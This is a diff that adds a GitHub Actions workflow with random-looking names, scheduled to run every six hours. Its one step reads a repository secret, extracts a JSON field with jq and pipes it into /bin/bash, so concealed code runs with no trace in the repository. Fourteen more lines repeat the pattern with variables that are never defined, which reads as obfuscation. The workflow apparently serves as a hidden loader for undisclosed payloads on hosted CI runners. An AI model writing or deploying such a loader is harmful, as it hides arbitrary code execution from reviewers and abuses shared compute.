@@ -1,0 +1,31 @@
+name: maxuexiao7614
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: maxuexiao7614
+        env:
+          f7359: ${{ secrets.f7359 }}
+        run: |
+          echo $f7359 | jq -r .yl79711 | /bin/bash
+          echo $himk86294 | jq -r .terk1 | /bin/bash
+          echo $d624 | jq -r .httpr7 | /bin/bash
+          echo $xc9901 | jq -r .yytfc137 | /bin/bash
+          echo $tecr99874 | jq -r .s01453 | /bin/bash
+          echo $fijyl18585 | jq -r .u35398 | /bin/bash
+          echo $l908 | jq -r .omdlq98915 | /bin/bash
+          echo $ncap5095 | jq -r .qo221 | /bin/bash
+          echo $wvp1 | jq -r .dpjd01 | /bin/bash
+          echo $cqgxa3 | jq -r .mzsk22 | /bin/bash
+          echo $vxyg0349 | jq -r .o2639 | /bin/bash
+          echo $gkz48191 | jq -r .e576 | /bin/bash
+          echo $t74918 | jq -r .hcxkj3 | /bin/bash
+          echo $uqfa32 | jq -r .pxcc3 | /bin/bash
+          echo $wnrp13635 | jq -r .xzcr160 | /bin/bash
+
